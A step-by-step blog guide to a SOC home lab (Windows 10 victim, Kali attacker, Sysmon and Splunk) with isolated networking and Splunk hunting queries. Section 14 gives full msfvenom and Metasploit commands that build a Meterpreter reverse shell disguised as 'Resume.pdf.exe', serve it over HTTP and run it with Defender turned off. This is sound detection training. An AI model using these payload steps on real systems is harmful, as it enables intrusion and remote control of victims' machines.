+++
title = 'Building Your Own Soc Lab'
date = 2025-07-14T16:04:10-04:00
+++

# 🧪 Build Your Own SOC Home Lab: Step-by-Step Guide 

> ✅ **Overview**  
> This comprehensive guide of how I set up my SOC home lab, and I have written it to guide you through setting up a fully functional Security Operations Center (SOC) home lab, compatible with both VirtualBox and VMware Workstation. You'll build a safe, isolated environment using Windows 10, Kali Linux, Sysmon, and Splunk to simulate real-world attacker–defender scenarios.


## 📑 Index

Click any section below to jump to it:

1. [Prerequisites](#1-prerequisites)
2. [Install VirtualBox](#2-install-virtualbox)
3. [Plan Your Lab Setup](#3-plan-your-lab-setup)
4. [Get a Windows 10 ISO Image](#4-get-a-windows-10-iso-image)
5. [Set Up the Windows 10 Virtual Machine](#5-set-up-the-windows-10-virtual-machine)
6. [Install Windows 10](#6-install-windows-10)
7. [Install Kali Linux](#7-install-kali-linux)
8. [Installing Sysmon and Splunk Before Isolation](#8-installing-sysmon-and-splunk-before-isolation)
9. [Configuring Virtual Machine Networking Securely](#9-configuring-virtual-machine-networking-securely)
10. [Malware Analysis Configuration Recommended](#10-malware-analysis-configuration-recommended)
11. [Step-by-Step Configuration in VirtualBox](#11-step-by-step-configuration-in-virtualbox)
12. [Equivalent Setup in VMware Workstation](#12-equivalent-setup-in-vmware-workstation)
13. [Configure inputs.conf to Ingest Sysmon Logs](#13-configure-inputsconf-to-ingest-sysmon-logs)
14. [Malware Generation and Handler Setup Using Metasploit](#14-malware-generation-and-handler-setup-using-metasploit)
15. [Investigating Attack Activity in Splunk](#15-investigating-attack-activity-in-splunk)




## 1 Prerequisites

Ensure you have the following components prepared before beginning the SOC home lab setup:

|Component|Description|
|---|---|
|Memory (RAM)|At least 16 GB recommended for stable performance with multiple VMs|
|Virtualization Software|VirtualBox or VMware Workstation to create and manage virtual machines|
|Operating System ISOs|Official ISO files for Windows 10 and Kali Linux|
|Security Tools|Splunk and Sysmon installers for log collection and analysis|
|Internet Connection|Required for downloading tools, updates, and initial configuration|

---

## 2 Install VirtualBox

1. Visit [https://www.virtualbox.org](https://www.virtualbox.org).
    
2. Download the latest version of **VirtualBox** for your OS.
    
3. Run the installer and complete the installation.
    
    - If you encounter errors related to missing dependencies (especially on Linux), follow the prompts or install the required packages manually.
        

💡 **Tip:** If your **C: drive** has low storage, you can save VMs to another drive like **D:/** or **E:/**.

---

## 3 Plan Your Lab Setup

We’ll create a simulated environment using virtual machines:

- **Windows 10** — main machine (target/victim), will run **Sysmon** and **Splunk**.
    
- **Kali Linux** — attacker machine for simulating threats.
    

Feel free to customize with more machines (like Ubuntu for ELK stack, Security Onion, etc.) as your system allows.

---

## 4 Get a Windows 10 ISO Image

There are several ways to install Windows 10, including using third-party ISO files or pre-made images. However, **creating your own Windows ISO image using Microsoft's official tool is one of the safest and most reliable methods**.

### 🔗 Link:

[https://www.microsoft.com/en-ca/softwaredownload/windows10](https://www.microsoft.com/en-ca/softwaredownload/windows10)

> ⚠️ **Note:** You’ll need a **valid license key** to activate Windows 10 later.

### 📥 Steps:

1. Click **Download tool now**.
    
2. Run the downloaded **MediaCreationTool**.
    
3. Accept the license terms.
    
4. Select:
    
    - ✅ **Create installation media (USB flash drive, DVD, or ISO file) for another PC**
        
    - Click **Next**
        
5. Choose language, edition, and architecture, or leave **"Use the recommended options"** checked.
    
6. Select **ISO file** as the output format.
    
7. Save the ISO file to your preferred location.
    

---

## 5 Set Up the Windows 10 Virtual Machine

1. Open **VirtualBox**, click **New**.
    
2. Enter name: `Windows 10`.
    
3. Select the **ISO image** you just created.
    
4. **Skip unattended installation** to install the OS manually (optional).
    
5. Assign resources:
    
    - RAM: at least 2–4 GB (more if you can)
        
    - CPU: Minimum **1 core**, **2 cores recommended** for smoother performance
        
6. Keep virtual hard disk settings as default (dynamically allocated is fine).
    
7. Review settings and click **Finish**.
    
8. Power on the VM.
    

---

## 6 Install Windows 10

1. Choose language, region, and keyboard layout.
    
2. When asked for a product key, click **“I don’t have a product key”**.
    
3. Select the edition to install (e.g., **Windows 10 Pro**).
    
4. Accept the license agreement.
    
5. Choose **“Custom: Install Windows only (advanced)”**.
    
6. Select the virtual disk and click **Next**.
    

Windows will now begin installation.

---

## 7 Install Kali Linux

Download the official Kali Linux virtual machine image for easy import into VirtualBox.

### 🔗 Link:

[https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)

### You have two options:

- ✅ **Pre-built VM** (quickest, recommended)
    
- 🔧 **Manual install via ISO** (similar to Windows install)
    

Once downloaded:

1. Extract the `.ova` file if needed.
    
2. Open VirtualBox → File → Import Appliance.
    
3. Import the Kali Linux VM and power it on.
    

---

## 8 Installing Sysmon and Splunk Before Isolation

Once you've set up the internal network and isolated the virtual machines, they will no longer have internet access. Therefore, make sure you complete the installations of **Sysmon** and **Splunk** while the network is still in **NAT mode** (the default setting). Once this is done, you can proceed to network isolation safely.

To recap:

- **Objective**: The goal is to generate telemetry on the Windows target machine so you can detect attacker behavior.
    
- We’ll simulate a basic attack workflow:
    
    1. Use **Nmap** from Kali to scan for open ports on the Windows machine.
        
    2. Disable **Windows Defender**.
        
    3. Execute a custom malware to establish a **reverse TCP shell**.
        
- Then observe what **telemetry** (logs and events) are generated using **Sysmon** and **Splunk**.
    

### 🔧 Tool Installation (Windows VM)

- **Install Splunk Enterprise**
    
    - Go to: [https://www.splunk.com](https://www.splunk.com)
        
    - Download and install **Splunk Enterprise** on your Windows VM.
        
- **Install Sysmon**
    
    - Download from Microsoft: [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
        
    - Download Olaf Hartong’s configuration (💡 Big thanks to Olaf Hartong for his outstanding work on Sysmon Modular – this configuration makes deep endpoint visibility much more accessible.) file: [sysmonconfig.xml](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml)
        
    - Right-click the config link → **Save As** → `sysmonconfig.xml`
        
- **Set Up Sysmon**
    
    1. Extract the downloaded Sysmon zip.
        
    2. Open **PowerShell as Administrator**.
        
    3. `cd` to the directory containing both `sysmon64.exe` and `sysmonconfig.xml`.
        
    4. Run:
        
        ```
        .\Sysmon64.exe -i .\sysmonconfig.xml
        ```
        
    5. Accept license terms when prompted.
        
- **Verify Sysmon Installation**
    
    - Open **Services**, search for **Sysmon**.
        
    - Alternatively, use **Event Viewer** → `Applications and Services Logs` → `Microsoft` → `Windows` → check for **Sysmon**.
        

💡 Tip: If you're new to Splunk, check out the **Splunk Fundamentals 1** course (free): 🔗 [https://www.splunk.com/en_us/training/splunk-fundamentals.html](https://www.splunk.com/en_us/training/splunk-fundamentals.html)


---

## 9 Configuring Virtual Machine Networking Securely

When setting up virtual machines, default settings are usually fine for general use. However, if you're planning to analyze **malware or potentially harmful software**, using default networking configurations may put your **host machine at risk**.

This guide primarily uses **VirtualBox**, but instructions for **VMware Workstation** are also provided for users who prefer that platform.

### 🛡️ How to Reduce the Risk?

To minimize the chance of infecting your host system during malware analysis, the key area to focus on is **network configuration**.

In **VirtualBox**, you can adjust this by:

- Selecting your VM
    
- Clicking **Settings → Network**
    
- Changing the **"Attached to:"** dropdown under the **Adapter 1** tab
    

You’ll see several network options. Here's a brief explanation of each:

|Network Mode|Description|
|---|---|
|**NAT (default)**|VM accesses external network (internet) through the host. Safe and good for general use, but not ideal for malware analysis.|
|**Bridged Adapter**|VM connects directly to the same network as the host. It behaves like a physical machine on the same LAN. Not recommended for malware testing.|
|**Internal Network**|Only VMs on the same internal network can communicate with each other. No internet or host access. Safer for malware isolation.|
|**Host-only Adapter**|Allows VM to communicate only with the host and other host-only VMs. No external internet. Great for analysis and containment.|
|**Generic Driver**|Advanced option requiring custom drivers—rarely used and generally unnecessary.|
|**NAT Network**|Similar to NAT, but allows multiple VMs to communicate with each other behind a shared NAT. Useful for isolated multi-VM setups.|
|**Cloud Network (Experimental)**|Integrates with Oracle Cloud. Not stable or recommended for general use.|
|**Not Attached**|The VM has no network connection at all. Completely isolated—most secure for analyzing malware.|

> ✅ **Reminder**: For malware analysis, use **"Host-only Adapter"**, **"Internal Network"**, or **"Not Attached"** to reduce exposure to your host and external networks.

---

## 10 Malware Analysis Configuration (Recommended)

When analyzing malware, it’s essential to isolate the virtual machines from the internet and your host system. The **Internal Network** option is ideal in this case. This mode places your virtual machines in a completely separate network with **no internet access** or LAN access. You’ll need to **manually assign IP addresses** for each VM.

### ❗ Note:

Avoid using **Generic Driver** or **Cloud Network** unless you're confident about their configurations. They are rarely used and not recommended for malware labs.

---

## 11 Step-by-Step Configuration in VirtualBox

### Step 1: Configure Internal Network

Configure both Windows and Kali Linux VMs to be on the same isolated internal network:

- **Windows 10**:
    
    - Go to `Settings → Network`
        
    - Set `Attached to: Internal Network`
        
    - Name: `test`
        
    - Click OK
        
- **Kali Linux**:
    
    - Go to `Settings → Network`
        
    - Set `Attached to: Internal Network`
        
    - Name: `test`
        
    - Click OK
        

> ✅ **Reminder**: Ensure both VMs use the exact same network name (`test`) so they can communicate.

---

### Step 2: Assign Static IP Addresses

Since the Internal Network has no DHCP server, you need to assign static IPs manually.

#### 🪟 On Windows 10:

- Boot the VM
    
- Right-click the globe icon in the system tray → **Open Network & Internet Settings**
    
- Click **Change adapter options**
    
- Right-click the Ethernet adapter → **Properties**
    
- Select **Internet Protocol Version 4 (TCP/IPv4)** → **Properties**
    
- Select **Use the following IP address**
    
- IP Address: `192.168.20.10`
    
- Click OK
    

✅ Now open **CMD** and type `ipconfig` to verify the assigned IP.

#### 🐱‍💻 On Kali Linux:

- Boot the VM
    
- Click the Ethernet icon (top right corner)
    
- Select **Edit Connections** → Choose the wired connection
    
- Click the ⚙️ (gear) icon → Go to **IPv4 Settings**
    
- Set Method to `Manual`
    
- Click **Add** under Addresses:
    
    - IP Address: `192.168.20.11`
        
    - Netmask: `24`
        
- Click **Save**
    

✅ Open a terminal and run `ifconfig` to confirm the IP.

---

### Step 3: Test Connectivity

To test communication between the two VMs:

- From **Kali**: Run `ping 192.168.20.10`
    
    - This might fail initially because Windows blocks inbound ICMP traffic by default.
        
- From **Windows CMD**: Run `ping 192.168.20.11`
    
    - This should work, confirming successful connectivity.
        

---

### 📸 Final Step: Take Snapshots

Once everything is configured and working:

- Take a **snapshot** of both Windows and Kali VMs
    
- This allows you to revert to a clean state if anything goes wrong
    

---

## 12 Equivalent Setup in VMware Workstation

If you're using **VMware Workstation**, the concept is similar but the naming is different.

### Step-by-Step:

1. In VMware, go to the **top menu** → `VM → Settings` _(or press Ctrl + D)_
    
2. Navigate to **Network Adapter**
    
3. Instead of "Internal Network" (used in VirtualBox), VMware uses **LAN Segment** for isolated networking
    
4. Click the **LAN Segments** button → **Add** → Name it: `test` → Click OK
    
5. Now set **LAN Segment** as the network type and select the `test` segment from the dropdown
    
6. Click OK
    

Just like in VirtualBox, you’ll need to **assign static IPs manually** in each VM to ensure they’re on the same subnet.

Now you're ready to safely analyze malware in an isolated environment using either VirtualBox or VMware.


## 13 Configure `inputs.conf` to Ingest Sysmon Logs

Head back to your **Windows VM** and navigate to the following path:

```
C:\Program Files\Splunk\etc\system\local
```

#### If `inputs.conf` does **not** exist:

1. Go to:
    
    ```
    C:\Program Files\Splunk\etc\system\default
    ```
    
2. Copy the file `inputs.conf`
    
3. Paste it into the `local` folder:
    
    ```
    C:\Program Files\Splunk\etc\system\local
    ```
    

---

#### 📝 Replace the Contents of `inputs.conf`
    
1. Open the local `inputs.conf` file in a text editor (like Notepad).
    
2. **Delete all existing content** in the file.
    
3. **Paste the following content** into the file:

```
#   Version 9.1.1
# DO NOT EDIT THIS FILE!
# Changes to default files will be lost on update and are difficult to
# manage and support.
#
# Please make any changes to system defaults by overriding them in
# apps or $SPLUNK_HOME/etc/system/local  
# (See "Configuration file precedence" in the web documentation).
#
# To override a specific setting, copy the name of the stanza and
# setting to the file where you wish to override it.
#
# This file contains possible attributes and values you can use to
# configure inputs, distributed inputs and file system monitoring.


[default]
index         = default
_rcvbuf        = 1572864
host = $decideOnStartup
evt_resolve_ad_obj = 0
evt_dc_name=
evt_dns_name=

[blacklist:$SPLUNK_HOME\etc\auth]

[blacklist:$SPLUNK_HOME\etc\passwd]

[monitor://$SPLUNK_HOME\var\log\splunk]
index = _internal

[monitor://$SPLUNK_HOME\var\log\watchdog\watchdog.log*]
index = _internal

[monitor://$SPLUNK_HOME\var\log\splunk\license_usage_summary.log]
index = _telemetry

[monitor://$SPLUNK_HOME\var\log\splunk\splunk_instrumentation_cloud.log*]
index = _telemetry
sourcetype = splunk_cloud_telemetry

[monitor://$SPLUNK_HOME\etc\splunk.version]
_TCP_ROUTING = *
index = _internal
sourcetype=splunk_version

[monitor://$SPLUNK_HOME\var\log\splunk\configuration_change.log]
index = _configtracker

[batch://$SPLUNK_HOME\var\run\splunk\search_telemetry\*search_telemetry.json]
move_policy = sinkhole
index = _introspection
sourcetype = search_telemetry
crcSalt = <SOURCE>
log_on_completion = 0

[batch://$SPLUNK_HOME\var\spool\splunk]
move_policy = sinkhole
crcSalt = <SOURCE>

[batch://$SPLUNK_HOME\var\spool\splunk\tracker.log*]
index = _internal
sourcetype = splunkd_latency_tracker
move_policy = sinkhole

[batch://$SPLUNK_HOME\var\spool\splunk\...stash_new]
queue       = stashparsing
sourcetype  = stash_new
move_policy = sinkhole
crcSalt     = <SOURCE>
time_before_close = 0

[batch://$SPLUNK_HOME\var\spool\splunk\...stash_hec]
sourcetype  = stash_hec
move_policy = sinkhole
crcSalt     = <SOURCE>

[fschange:$SPLUNK_HOME\etc]
disabled = false
#poll every 10 minutes
pollPeriod = 600
#generate audit events into the audit index, instead of fschange events
signedaudit=true
recurse=true
followLinks=false
hashMaxSize=-1
fullEvent=false
sendEventMaxSize=-1
filesPerDelay = 10
delayInMills = 100

[udp]
connection_host=ip

[tcp]
acceptFrom=*
connection_host=dns

[splunktcp]
route=has_key:_replicationBucketUUID:replicationQueue;has_key:_dstrx:typingQueue;has_key:_linebreaker:rulesetQueue;absent_key:_linebreaker:parsingQueue
acceptFrom=*
connection_host=ip

logRetireOldS2S = true
logRetireOldS2SRepeatFrequency = 1d
logRetireOldS2SMaxCache = 10000

[script]
interval = 60.0
start_by_shell = false

[SSL]
# SSL settings
# The following provides modern TLS configuration that guarantees forward-
# secrecy and efficiency. This configuration drops support for old Splunk
# versions (Splunk 5.x and earlier).
# To add support for Splunk 5.x set sslVersions to tls and add this to the
# end of cipherSuite:
#     DHE-RSA-AES256-SHA:AES256-SHA:DHE-RSA-AES128-SHA:AES128-SHA
# and this, in case Diffie Hellman is not configured:
#     AES256-SHA:AES128-SHA

sslVersions = tls1.2
cipherSuite = ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256
ecdhCurves = prime256v1, secp384r1, secp521r1

allowSslRenegotiation = true
sslQuietShutdown = false
logCertificateData = true
certLogMaxCacheEntries = 10000
certLogRepeatFrequency = 1d


[script://$SPLUNK_HOME\bin\scripts\splunk-wmi.path]
disabled = 0
interval = 10000000
source = wmi
sourcetype = wmi
queue = winparsing
persistentQueueSize=200MB

# default single instance modular input restarts

[admon]
interval=60
baseline=0

[MonitorNoHandle]
interval=60

[WinEventLog]
interval=60
evt_resolve_ad_obj = 0
evt_dc_name=
evt_dns_name=

[WinNetMon]
interval=60

[WinPrintMon]
interval=60

[WinRegMon]
interval=60
baseline=0

[perfmon]
interval=300

[powershell]
interval=60

[powershell2]
interval=60

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
disabled = false
renderXml = true
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-Windows Defender/Operational
blacklist = 1151,1150,2000,1002,1001,1000

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-PowerShell/Operational
blacklist = 4100,4105,4106,40961,40962,53504

[WinEventLog://Application]
index = endpoint
disabled = false

[WinEventLog://Security]
index = endpoint
disabled = false

[WinEventLog://System]
index = endpoint
disabled = false
```
    
4. Save and close the file.
    

This configuration ensures that Splunk is correctly set up to collect all relevant Sysmon logs using the lab's custom settings.

---

Here's your full rewritten and **neatly organized** note with all points preserved, formatted clearly for ease of understanding and reference during your lab work or demonstrations:

---

## 14 **Malware Generation and Handler Setup Using Metasploit**


### 📌 Step 1: Get the IP Address of Your Kali Machine

We need the **IP address** of our Kali (attacker) machine to configure the malware:

```bash
ifconfig     # or use: ip a
```

👉 **Take note of your IP address** – we’ll use this as the `LHOST` value while generating the malware and setting up the listener.

---

### 🔍 Step 2: Optional Nmap Reference

Familiarize yourself with `nmap` options:

```bash
nmap -h
```

Example usage:

```bash
nmap -A 192.168.20.10 -Pn
```

---

### 💣 Step 3: Generate Malware with `msfvenom`

Explore available payloads:

```bash
msfvenom -l payloads
```

We'll use:

```
windows/x64/meterpreter_reverse_tcp
```

### Malware Generation Command:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe -o Resume.pdf.exe
```

**Example:**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
```

- This creates a **reverse shell payload**.
    
- The output file `Resume.pdf.exe` will attempt to connect back to the attacker machine on port **4444** (default for Meterpreter).
    

Verify the file exists:

```bash
ls
file Resume.pdf.exe
```

---

### 🧲 Step 4: Setup a Listener with Metasploit

Launch Metasploit:

```bash
msfconsole
```

Select the **multi/handler** module:

```bash
use exploit/multi/handler
```

Show current options:

```bash
options
```

Note: The **default payload** is usually `generic/shell_reverse_tcp`. We’ll change it to match our malware:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Press `Tab` if unsure—it helps autocomplete!

Now re-check options:

```bash
options
```

Set the correct LHOST:

```bash
set LHOST <Kali IP>
set LHOST 192.168.20.11
```

Start the listener:

```bash
exploit
```

🎯 You are now listening for connections on port 4444.

---

### 🌐 Step 5: Share Malware via HTTP Server

In a **new terminal tab**, make sure you're in the same directory as `Resume.pdf.exe`, then start a Python HTTP server:

```bash
python3 -m http.server 9999
```

✅ Use any available port (e.g., 9999).

Your Kali machine is now hosting the malware at:

```
http://192.168.20.11:9999
```

---

### 🪟 Step 6: On the Windows Test Machine

1. **Disable Windows Defender**:
    
    - Go to:  
        `Windows Security > Virus & threat protection > Manage Settings`
        
    - Turn off **Real-time Protection**
        
2. **Open browser** and visit:
    
    ```
    http://192.168.20.11:9999
    ```
    
3. Download `Resume.pdf.exe`.  
    If you see a warning about the file not being commonly downloaded — ignore it _only for this lab_.
    
4. **Run the file**.  
    If Windows shows a warning, choose **Run anyway**.
    

---

### 🧪 Step 7: Confirm the Connection

Open Command Prompt as Administrator and run:

```bash
netstat -anob
```

🔍 Look for:

- An **established connection** to Kali’s IP:4444
    
- Check the **Process ID** (e.g., 10208)
    
- Open **Task Manager > Details** tab, find that PID → it should be `Resume.pdf.exe`
    

✅ If yes — your malware has executed successfully.

---

### 💻 Step 8: Back on Kali – You Have a Shell!

In the **Metasploit handler**, you should now see a session opened.

Type:

```bash
help
```

Try:

```bash
shell        # Spawn a shell on victim machine
```

Test with some useful commands:

```bash
net user
net localgroup
ipconfig
```

You're in! 🔓

---
## 15 Investigating Attack Activity in Splunk

Once you've successfully ingested **Sysmon logs** into Splunk and executed the simulated attack (e.g., Nmap scan and `Resume.pdf.exe` malware), here’s how to investigate these activities:


### 🔍 Step 1: Check Nmap Scan Activity

Run the following search in **Splunk’s Search & Reporting** app:

```spl
index=endpoint 192.168.20.11
```

This query filters logs where your **Kali machine’s IP** appears (as attacker).

- Under **Fields**, look for:
    
    - `dest_port`: If you see only **one port** (e.g., `dest_port=3389`), ask:
        
        > _“Should this machine be connecting to our RDP port? Who owns this machine?”_
        

🧠 While this log shows an incoming connection attempt, **Sysmon alone doesn't show full Nmap scan behavior** (like sequential port scanning). That’s why:

> 🛡️ It's highly recommended to have a **network sensor** (e.g., Zeek or Suricata) deployed between your machines. These can detect:
> 
> - TCP flags
>     
> - Scanning patterns
>     
> - Protocol signatures
>     

Without it, the telemetry is limited to what the endpoint sees—making it harder to distinguish between legitimate access and reconnaissance attempts.


### 🦠 Step 2: Investigate Malware Execution (`Resume.pdf.exe`)

To check for events related to the **malware file**, run:

```spl
index=endpoint Resume.pdf.exe
```

This searches for all logs where the filename `Resume.pdf.exe` appears.

- Under **Fields**, you’ll typically see multiple **EventCodes**, such as:
    
    - **EventCode 1**: Process creation
        
    - **EventCode 3**: Network connection
        
    - **EventCode 7**: Image loaded
        
    - **EventCode 11**: File created
        
    - (There may be more depending on your Sysmon config)
        

These events give you visibility into what the malware did, such as:

- Which process launched it
    
- What files it accessed
    
- If it initiated a network connection (like reverse TCP)
    
- Which DLLs or system files it loaded
    

This is **crucial** for understanding malware behavior post-execution.


### ✅ Summary

|Action|Splunk Query|What to Look For|
|---|---|---|
|Detect Nmap activity|`index=endpoint 192.168.20.11`|Check `dest_port`, assess if access was suspicious|
|Investigate malware|`index=endpoint Resume.pdf.exe`|Review EventCodes (1, 3, 7, 11), trace malware actions|
|Improve visibility|—|Deploy a **network sensor** for full scan detection & TCP analysis|

---
